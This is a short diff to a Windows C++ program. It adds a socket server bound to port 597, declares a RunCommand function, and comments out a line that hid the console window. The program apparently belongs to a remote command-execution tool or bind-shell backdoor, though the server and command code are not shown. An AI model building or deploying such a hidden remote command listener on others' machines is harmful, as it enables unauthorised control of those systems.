@@ -15,14 +15,22 @@ int main(int argc, char *argv[])
 #include <winsock.h>
 #include <Windows.h>
 
+#include "Server.h"
+
 std::string RunCommand(std::string Input);
 
 int main(int argc, char *argv[])
 {
 	// Hide window
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
-
+	Server server=Server();
+	if(!server.Bind("597"))
+	{
+		return 1;
+	}
+	server.Start();
+	server.Shutdown();
 
 	return 0;
 }
